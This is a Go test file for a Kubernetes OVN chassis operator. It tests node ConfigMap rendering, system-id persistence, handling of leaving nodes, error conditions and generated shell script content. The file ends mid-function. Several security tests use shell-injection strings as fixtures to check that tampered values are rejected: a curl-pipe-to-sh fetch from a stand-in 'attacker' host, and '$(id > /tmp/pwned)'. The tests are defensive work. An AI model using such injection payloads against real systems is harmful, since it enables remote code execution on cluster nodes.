// SPDX-FileCopyrightText: Copyright 2026 SAP SE or an SAP affiliate company
//
// SPDX-License-Identifier: Apache-2.0

package controller

import (
	"context"
	"strings"
	"testing"

	. "github.com/onsi/gomega"
	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/tools/record"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/interceptor"

	ovnv1alpha1 "github.com/c5c3/cobaltcore/operators/ovn/api/v1alpha1"
)

// The two node names every test below selects from, and the identity a node
// carries once it has been rendered. The identity is fixed where a test asserts
// that it survives, because a system-id the operator regenerated is exactly the
// failure those tests exist to catch.
const (
	testNodeA         = "node-a"
	testNodeB         = "node-b"
	testFixedSystemID = "11111111-2222-3333-4444-555555555555"
)

// uuidPattern matches the form k8s.io/apimachinery's uuid generator produces. A
// system-id is opaque to the operator, so the tests assert its shape rather than
// its value.
const uuidPattern = `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`

// hashPattern matches a rendered config hash: eight lowercase hex characters.
const hashPattern = `^[0-9a-f]{8}$`

// chassisNode builds a node carrying the given labels.
func chassisNode(name string, nodeLabels map[string]string) *corev1.Node {
	return &corev1.Node{ObjectMeta: metav1.ObjectMeta{Name: name, Labels: nodeLabels}}
}

// selectedLabels are the labels the shared chassis fixture's nodeSelector
// matches.
func selectedLabels() map[string]string {
	return map[string]string{testChassisNodeLabel: "true"}
}

// gatewayLabels are the labels of a node that is both selected and a gateway.
func gatewayLabels() map[string]string {
	return map[string]string{testChassisNodeLabel: "true", testGatewayNodeLabel: "true"}
}

// seededNodesConfigMap builds the nodes ConfigMap as an earlier pass left it, so
// a test can pin the identity a later pass has to keep.
func seededNodesConfigMap(entries map[string]nodeEntry) *corev1.ConfigMap {
	data := make(map[string]string, len(entries))
	for name, entry := range entries {
		data[name] = entry.render()
	}
	return &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{Name: testOVNChassisName + "-nodes", Namespace: testNamespace},
		Data:       data,
	}
}

// readNodesConfigMap reads the applied nodes ConfigMap back.
func readNodesConfigMap(ctx context.Context, t *testing.T, r *OVNChassisReconciler) *corev1.ConfigMap {
	t.Helper()

	var cm corev1.ConfigMap
	if err := r.Get(ctx, chassisKey(testOVNChassisName+"-nodes"), &cm); err != nil {
		t.Fatalf("reading the nodes ConfigMap back: %v", err)
	}
	return &cm
}

// The rendered entry is the whole channel between the operator and a node, so
// its bytes are part of the contract with apply-node.sh: the script sources the
// file, and a key it does not expect is a value it never applies.
func TestNodeEntryRenderAndHash(t *testing.T) {
	g := NewGomegaWithT(t)

	entry := nodeEntry{
		systemID:       testFixedSystemID,
		gateway:        true,
		bridgeMappings: "physnet1:br-ex",
		encapType:      "geneve",
	}

	g.Expect(entry.render()).To(Equal(
		"SYSTEM_ID=" + testFixedSystemID + "\n" +
			"GATEWAY=true\n" +
			"BRIDGE_MAPPINGS=physnet1:br-ex\n" +
			"ENCAP_TYPE=geneve\n"))
	g.Expect(entry.hash()).To(MatchRegexp(hashPattern))

	// An entry with nothing set still renders every key but LEAVING, so the
	// script sources a complete file whatever the operator knows about the node.
	g.Expect(nodeEntry{}.render()).To(Equal(
		"SYSTEM_ID=\nGATEWAY=false\nBRIDGE_MAPPINGS=\nENCAP_TYPE=\n"))

	leaving := entry
	leaving.leaving = true
	g.Expect(leaving.render()).To(HaveSuffix("ENCAP_TYPE=geneve\nLEAVING=true\n"))
	g.Expect(leaving.hash()).NotTo(Equal(entry.hash()),
		"a node on its way out must not look to the maintenance step like one that is staying")
}

// A live ConfigMap value has to parse back into the entry it was rendered from:
// it is where a node's system-id survives a status the API server lost.
func TestParseNodeEntry_RoundTripsAndIgnoresUnknownKeys(t *testing.T) {
	g := NewGomegaWithT(t)

	entry := nodeEntry{
		systemID:       testFixedSystemID,
		gateway:        true,
		bridgeMappings: "physnet1:br-ex,physnet2:br-data",
		encapType:      "vxlan",
		leaving:        true,
	}

	g.Expect(parseNodeEntry(entry.render())).To(Equal(entry))

	// A key a later operator version added, and a line that carries no separator
	// at all, both leave the known values alone.
	extended := entry.render() + "FUTURE_KEY=whatever\n# a comment\n"
	g.Expect(parseNodeEntry(extended)).To(Equal(entry))

	g.Expect(parseNodeEntry("")).To(Equal(nodeEntry{}),
		"an empty ConfigMap value carries no identity, and inventing one would be worse than none")
}

// Nothing matching is a configuration a chassis can sit in for a while (the
// nodes are labelled after the CR is applied), so it reports rather than fails.
// Both ConfigMaps are still applied: a pod cannot start on a volume whose
// ConfigMap does not exist.
func TestReconcileNodes_NoMatchingNodes(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, map[string]string{"role": "control-plane"}))

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeEmpty())
	g.Expect(cr.Status.Nodes).To(BeEmpty())

	g.Expect(readNodesConfigMap(ctx, t, r).Data).To(BeEmpty())
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &corev1.ConfigMap{})).To(Succeed())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond).NotTo(BeNil())
	g.Expect(cond.Status).To(Equal(metav1.ConditionFalse))
	g.Expect(cond.Reason).To(Equal(conditionReasonNoMatchingNodes))
	g.Expect(cond.Message).To(ContainSubstring(testChassisNodeLabel+"=true"),
		"the message has to name the selector that matched nothing")
}

// One key per selected node, and nothing for the nodes the selector skips.
func TestReconcileNodes_RendersOneKeyPerSelectedNode(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, map[string]string{"role": "control-plane"}))

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(HaveLen(1))

	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(1))
	g.Expect(data).To(HaveKey(testNodeA))

	entry := parseNodeEntry(data[testNodeA])
	g.Expect(entry.systemID).To(MatchRegexp(uuidPattern))
	g.Expect(entry.gateway).To(BeFalse())
	g.Expect(entry.encapType).To(Equal("geneve"))
	g.Expect(entry.bridgeMappings).To(BeEmpty())
	g.Expect(entry.leaving).To(BeFalse())

	g.Expect(cr.Status.Nodes).To(HaveLen(1))
	g.Expect(cr.Status.Nodes[0].Name).To(Equal(testNodeA))
	g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(entry.systemID))
	g.Expect(cr.Status.Nodes[0].ConfigHash).To(MatchRegexp(hashPattern))
	g.Expect(cr.Status.Nodes[0].Leaving).To(BeFalse())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond.Status).To(Equal(metav1.ConditionTrue))
	g.Expect(cond.Reason).To(Equal(conditionReasonNodesRendered))
	g.Expect(cond.Message).To(Equal("Rendered 1 node entries (0 leaving)"))
}

// The identity in the live ConfigMap wins over a fresh one. A regenerated
// system-id leaves the previous registration behind in the Southbound database,
// where it keeps claiming the ports of the workloads on this very node.
func TestReconcileNodes_KeepsSystemIDFromTheLiveConfigMap(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: testFixedSystemID, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	for pass := 1; pass <= 2; pass++ {
		_, _, err := r.reconcileNodes(ctx, r.Client, cr)
		g.Expect(err).NotTo(HaveOccurred(), "pass %d", pass)

		entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA])
		g.Expect(entry.systemID).To(Equal(testFixedSystemID), "pass %d", pass)
		g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(testFixedSystemID), "pass %d", pass)
	}
}

// With no ConfigMap left, status is the last record of a node's identity, and it
// is preferred over a fresh one for the same reason.
func TestReconcileNodes_FallsBackToStatusSystemID(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{{Name: testNodeA, SystemID: testFixedSystemID}}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).systemID).
		To(Equal(testFixedSystemID))
}

// spec.gateway narrows the selected nodes down to the ones that announce
// enable-chassis-as-gw. It can only narrow: a node the gateway selector matches
// but the node selector does not belongs to no chassis at all.
func TestReconcileNodes_GatewayFromGatewaySelector(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.Gateway = &ovnv1alpha1.OVNGatewaySpec{
		NodeSelector: map[string]string{testGatewayNodeLabel: "true"},
	}
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, gatewayLabels()),
		chassisNode("node-c", map[string]string{testGatewayNodeLabel: "true"}))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(2), "the gateway selector may only narrow the selected set")
	g.Expect(parseNodeEntry(data[testNodeA]).gateway).To(BeFalse())
	g.Expect(parseNodeEntry(data[testNodeB]).gateway).To(BeTrue())

	g.Expect(cr.Status.Nodes[0].Gateway).To(BeFalse())
	g.Expect(cr.Status.Nodes[1].Gateway).To(BeTrue())
}

// The mappings keep spec order, because that is the order an operator reading
// ovn-bridge-mappings back off a node expects to find them in.
func TestReconcileNodes_BridgeMappingsInSpecOrder(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.BridgeMappings = []ovnv1alpha1.OVNBridgeMapping{
		{PhysicalNetwork: "physnet1", Bridge: "br-ex"},
		{PhysicalNetwork: "physnet2", Bridge: "br-data"},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).bridgeMappings).
		To(Equal("physnet1:br-ex,physnet2:br-data"))
}

// A node that loses the selector label keeps its entry, marked leaving. Its
// chassis registration outlives the selection, and the system-id the deletion
// Job addresses has to outlive it too.
func TestReconcileNodes_UnselectedNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())
	registered := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB]).systemID
	g.Expect(registered).To(MatchRegexp(uuidPattern))

	var node corev1.Node
	g.Expect(r.Get(ctx, client.ObjectKey{Name: testNodeB}, &node)).To(Succeed())
	node.Labels = map[string]string{}
	g.Expect(r.Update(ctx, &node)).To(Succeed())

	_, _, err = r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	data := readNodesConfigMap(ctx, t, r).Data
	g.Expect(data).To(HaveLen(2), "the entry survives the deselection until the deletion Job has run")
	g.Expect(data[testNodeB]).To(ContainSubstring("LEAVING=true"))
	g.Expect(parseNodeEntry(data[testNodeB]).systemID).To(Equal(registered),
		"the identity the deletion Job addresses must not change on the way out")

	g.Expect(cr.Status.Nodes).To(HaveLen(2))
	g.Expect(cr.Status.Nodes[1].Name).To(Equal(testNodeB))
	g.Expect(cr.Status.Nodes[1].Leaving).To(BeTrue())
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Message).To(ContainSubstring("(1 leaving)"))
}

// A node that left the cluster is no different: the ConfigMap key is what keeps
// the record of what has still to be deregistered.
func TestReconcileNodes_GoneNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr,
		chassisNode(testNodeA, selectedLabels()),
		chassisNode(testNodeB, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(r.Delete(ctx, chassisNode(testNodeB, nil))).To(Succeed())

	_, _, err = r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(readNodesConfigMap(ctx, t, r).Data[testNodeB]).To(ContainSubstring("LEAVING=true"))
	g.Expect(cr.Status.Nodes[1].Leaving).To(BeTrue())
}

// A node recorded in status but missing from the ConfigMap has never been
// rendered as leaving, so it is picked up from status alone. Its identity comes
// from status too, which is all the deletion Job needs.
func TestReconcileNodes_StatusOnlyNodeStaysAsLeaving(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeB, SystemID: testFixedSystemID, Gateway: true},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB])
	g.Expect(entry.leaving).To(BeTrue())
	g.Expect(entry.systemID).To(Equal(testFixedSystemID))
	g.Expect(entry.gateway).To(BeTrue())
}

// Once the deletion Job has succeeded, the maintenance step drops the ConfigMap
// key and the status entry together. A leaving node that is already out of the
// ConfigMap is therefore deregistered, and re-adding it would spawn a Job for a
// chassis that no longer exists.
func TestReconcileNodes_LeavingNodeAbsentFromConfigMapIsDropped(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeA, SystemID: testFixedSystemID},
		{Name: testNodeB, SystemID: "gone", Leaving: true},
	}
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: testFixedSystemID, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	entries, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(entries).To(HaveLen(1))
	g.Expect(readNodesConfigMap(ctx, t, r).Data).NotTo(HaveKey(testNodeB))
	g.Expect(cr.Status.Nodes).To(HaveLen(1))
	g.Expect(cr.Status.Nodes[0].Name).To(Equal(testNodeA))
}

// A target cluster that grants the operator no nodes verb fails here. The
// condition has to flip on that pass: the aggregate Ready is re-derived from the
// sub-conditions at the new observedGeneration, so a condition left untouched
// would report the failed pass as ready.
func TestReconcileNodes_ListErrorIsNodeListError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr).
		WithInterceptorFuncs(interceptor.Funcs{
			List: func(ctx context.Context, cl client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
				if _, ok := list.(*corev1.NodeList); ok {
					return apierrors.NewForbidden(corev1.Resource("nodes"), "", nil)
				}
				return cl.List(ctx, list, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("listing nodes")))
	g.Expect(apierrors.IsForbidden(err)).To(BeTrue(), "the API error must stay unwrappable")
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeNil())

	cond := ovnChassisCondition(cr, conditionTypeNodesReady)
	g.Expect(cond.Status).To(Equal(metav1.ConditionFalse))
	g.Expect(cond.Reason).To(Equal(conditionReasonNodeListError))
}

// A ConfigMap that cannot be read is not a first pass: rendering on top of it
// would hand every node a fresh system-id and orphan its registration, so the
// pass fails instead.
func TestReconcileNodes_ConfigMapReadErrorIsNodesError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr).
		WithInterceptorFuncs(interceptor.Funcs{
			Get: func(ctx context.Context, cl client.WithWatch, key client.ObjectKey, obj client.Object, opts ...client.GetOption) error {
				if _, ok := obj.(*corev1.ConfigMap); ok {
					return apierrors.NewForbidden(corev1.Resource("configmaps"), key.Name, nil)
				}
				return cl.Get(ctx, key, obj, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("reading the chassis-nodes ConfigMap")))
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Reason).To(Equal(conditionReasonNodesError))
}

// A target cluster that grants the operator no configmaps verb fails the same
// way, under the reason that covers everything the step projects.
func TestReconcileNodes_ConfigMapApplyErrorIsNodesError(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()

	c := ovnChassisFakeClientBuilder(t, cr, chassisNode(testNodeA, selectedLabels())).
		WithInterceptorFuncs(interceptor.Funcs{
			Apply: func(ctx context.Context, cl client.WithWatch, obj runtime.ApplyConfiguration, opts ...client.ApplyOption) error {
				if kinded, ok := obj.(kindedApplyConfiguration); ok && kinded.GetKind() == "ConfigMap" {
					return apierrors.NewForbidden(corev1.Resource("configmaps"), testOVNChassisName+"-nodes", nil)
				}
				return cl.Apply(ctx, obj, opts...)
			},
		}).Build()
	r := &OVNChassisReconciler{Client: c, Scheme: newTestScheme(t), Recorder: record.NewFakeRecorder(10)}

	entries, res, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).To(MatchError(ContainSubstring("ensuring chassis-nodes ConfigMap")))
	g.Expect(apierrors.IsForbidden(err)).To(BeTrue())
	g.Expect(res.IsZero()).To(BeTrue())
	g.Expect(entries).To(BeNil())
	g.Expect(ovnChassisCondition(cr, conditionTypeNodesReady).Reason).To(Equal(conditionReasonNodesError))
}

// The scripts ConfigMap carries every script the chassis containers and the
// maintenance Jobs run. A missing key is a container that cannot start or a Job
// that cannot deregister a chassis.
func TestReconcileNodes_ScriptsConfigMapCarriesSevenKeys(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	g.Expect(cm.Data).To(HaveLen(7))
	for _, key := range []string{
		hostPrepareScriptKey, applyNodeScriptKey, runOVSDBScriptKey,
		runVswitchdScriptKey, evacuateScriptKey, chassisDelScriptKey,
		fabricNodeScriptKey,
	} {
		g.Expect(cm.Data).To(HaveKey(key))
		g.Expect(cm.Data[key]).To(HavePrefix("#!/bin/bash\n"), key)
	}
}

// run-vswitchd.sh pins the revalidator count after the database is
// initialised and before the daemon starts, so ovs-vswitchd reads the pinned
// value on its first pass rather than starting with the CPU-derived one.
func TestReconcileNodes_RunVswitchdPinsTheRevalidatorThreads(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	script := cm.Data[runVswitchdScriptKey]
	pin := `ovs-vsctl --no-wait set open . other_config:n-revalidator-threads="${OVS_REVALIDATOR_THREADS}"`
	g.Expect(script).To(ContainSubstring(pin))
	g.Expect(script).To(HavePrefix("#!/bin/bash\nset -eu\n"),
		"set -eu stops the container before the exec when the init or the pin fails")

	initAt := strings.Index(script, "ovs-vsctl --no-wait init")
	pinAt := strings.Index(script, pin)
	execAt := strings.Index(script, "exec ovs-vswitchd")
	g.Expect(initAt).To(BeNumerically(">=", 0))
	g.Expect(pinAt).To(BeNumerically(">", initAt), "the pin needs the initialised Open_vSwitch row")
	g.Expect(execAt).To(BeNumerically(">", pinAt), "the daemon must start with the pinned count")
}

// ovsdb-server runs as the unprivileged openstack user and locks
// .conf.db.~lock~ before it opens the database beside it. ovsdb-tool creates
// that lock file as root, so host-prepare.sh has to hand over both files: with
// only the database chowned, every ovsdb-server start fails with "failed to
// lock lockfile" and the chassis DaemonSet never reports a ready pod.
func TestReconcileNodes_HostPrepareChownsTheDatabaseAndItsLockFile(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	script := cm.Data[hostPrepareScriptKey]
	g.Expect(script).To(ContainSubstring("chown 42424:42424 /run/openvswitch/conf.db"))
	g.Expect(script).To(ContainSubstring("chown 42424:42424 /run/openvswitch/.conf.db.~lock~"))
	// Guarded, because ovsdb-tool writes the lock file only when it creates or
	// converts the database. An unguarded chown would abort the script under
	// "set -eu" on every node whose database is already current.
	g.Expect(script).To(ContainSubstring("if [ -e /run/openvswitch/.conf.db.~lock~ ]; then"))
}

// The datapath daemons run as uid 0 with every capability dropped but the ones
// they are named for, so CAP_DAC_OVERRIDE is gone and uid 0 is an ordinary user
// against the file mode. Everything they need under /run/openvswitch belongs to
// the unprivileged user ovsdb-server runs as, so the run directories must be
// group-writable and ovsdb-server must create its socket group-writable too.
// Without either, ovs-vswitchd cannot connect to the database or write its pid
// file, and the wait loop in run-vswitchd.sh spins forever without logging.
func TestReconcileNodes_ScriptsShareTheRunDirsWithTheDatapathGroup(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	g.Expect(cm.Data[hostPrepareScriptKey]).To(
		ContainSubstring("install -d -m 0775 -o 42424 -g 42424 /run/openvswitch /run/ovn"),
		"a 0755 run directory lets no other user create a pid file or a socket in it")
	g.Expect(cm.Data[runOVSDBScriptKey]).To(ContainSubstring("umask 002"),
		"the default umask clears the group write bit ovsdb-server puts on db.sock")
	g.Expect(cm.Data[runOVSDBScriptKey]).To(ContainSubstring("exec ovsdb-server /run/openvswitch/conf.db"))
}

// spec.bridgeMappings is optional, and the overwhelming majority of chassis
// carry none. ovs-vsctl rejects an empty value outright, so setting the key
// unconditionally fails apply-node.sh under set -eu and the ovn-controller
// container never starts on any node of the CR.
func TestReconcileNodes_ApplyNodeRemovesEmptyBridgeMappingsRatherThanSettingThem(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	var cm corev1.ConfigMap
	g.Expect(r.Get(ctx, chassisKey(testOVNChassisName+"-chassis-scripts"), &cm)).To(Succeed())
	script := cm.Data[applyNodeScriptKey]
	// The unguarded form is a continuation line of the unconditional set.
	g.Expect(script).NotTo(ContainSubstring("\\\n  external_ids:ovn-bridge-mappings="),
		"the key must never be set unguarded; ovs-vsctl rejects an empty value")
	g.Expect(script).To(ContainSubstring(
		`if [ -n "${BRIDGE_MAPPINGS}" ]; then ovs-vsctl --timeout=15 set open . external_ids:ovn-bridge-mappings="${BRIDGE_MAPPINGS}"`))
	g.Expect(script).To(ContainSubstring(
		"else ovs-vsctl --timeout=15 remove open . external_ids ovn-bridge-mappings; fi"),
		"an emptied mapping list must clear the key on the node rather than leave it behind")
}

// configHash records what a node has applied, not what was rendered for it. A
// spec change therefore leaves the recorded hash where it is, which is the drift
// the maintenance step acts on.
func TestReconcileNodes_ConfigHashCarriedFromStatus(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())
	applied := cr.Status.Nodes[0].ConfigHash
	g.Expect(applied).To(MatchRegexp(hashPattern))

	cr.Spec.EncapType = "vxlan"
	entries, _, err := r.reconcileNodes(ctx, r.Client, cr)
	g.Expect(err).NotTo(HaveOccurred())

	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).encapType).To(Equal("vxlan"))
	g.Expect(entries[testNodeA].hash()).NotTo(Equal(applied))
	g.Expect(cr.Status.Nodes[0].ConfigHash).To(Equal(applied),
		"the recorded hash is what the node applied, so the drift stays visible")
}

// The nodes ConfigMap is sourced as shell by apply-node.sh in a privileged init
// container, so a value that is not the UUID the operator generated must never
// be rendered back out. Without the shape check a principal with update access
// on the ConfigMap gets command execution on every selected node, and the
// operator re-persists the injected value on every pass and copies it into
// status, so the tamper survives every reconcile and every pod restart.
func TestReconcileNodes_RejectsTamperedSystemID(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	tampered := "$(curl -s http://attacker/x | sh)"
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeA: {systemID: tampered, encapType: "geneve"},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	entry := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA])
	g.Expect(entry.systemID).NotTo(Equal(tampered))
	g.Expect(entry.systemID).To(MatchRegexp(uuidPattern))
	g.Expect(cr.Status.Nodes[0].SystemID).To(Equal(entry.systemID),
		"status must not carry the injected value forward either")
}

// status.nodes is the second record a system-id is read back from, and it is
// writable by anything holding the CR's status subresource, so it gets the same
// shape check.
func TestReconcileNodes_RejectsTamperedSystemIDInStatus(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Status.Nodes = []ovnv1alpha1.OVNChassisNodeStatus{
		{Name: testNodeA, SystemID: "$(id > /tmp/pwned)"},
	}
	r := newTestOVNChassisReconciler(t, cr, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	g.Expect(parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeA]).systemID).
		To(MatchRegexp(uuidPattern))
}

// A node on its way out is rendered from the spec rather than from whatever the
// live ConfigMap carries, so a tampered BRIDGE_MAPPINGS cannot be re-persisted
// through the leaving arm either.
func TestReconcileNodes_LeavingEntryRendersMappingsFromSpec(t *testing.T) {
	g := NewGomegaWithT(t)
	ctx := context.Background()
	cr := testOVNChassis()
	cr.Spec.BridgeMappings = []ovnv1alpha1.OVNBridgeMapping{
		{PhysicalNetwork: "physnet1", Bridge: "br-ex"},
	}
	seeded := seededNodesConfigMap(map[string]nodeEntry{
		testNodeB: {
			systemID:       testFixedSystemID,
			bridgeMappings: "$(curl -s http://attacker/x | sh)",
			encapType:      "$(id)",
		},
	})
	r := newTestOVNChassisReconciler(t, cr, seeded, chassisNode(testNodeA, selectedLabels()))

	_, _, err := r.reconcileNodes(ctx, r.Client, cr)

	g.Expect(err).NotTo(HaveOccurred())
	leaving := parseNodeEntry(readNodesConfigMap(ctx, t, r).Data[testNodeB])
	g.Expect(leaving.leaving).To(BeTrue())
	g.Expect(leaving.systemID).To(Equal(testFixedSystemID),
		"the identity the deletion Job addresses still has to survive")
	g.Expect(leaving.bridgeMappings).To(Equal("physnet1:br-ex"))
	g.Expect(leaving.encapType).To(Equal("geneve"))
}

// The selector goes to the API server rather than being applied client-side.
// LiveReader hands out the target cluster's uncached reader, so an unfiltered
// LIST serializes every Node object in the cluster on every pass of every
// OVNChassis, and a DaemonSet rollout produces one such pass per node.
func TestReconcileNodes_ListsNodesWithTheSelector(t *testing.T) {
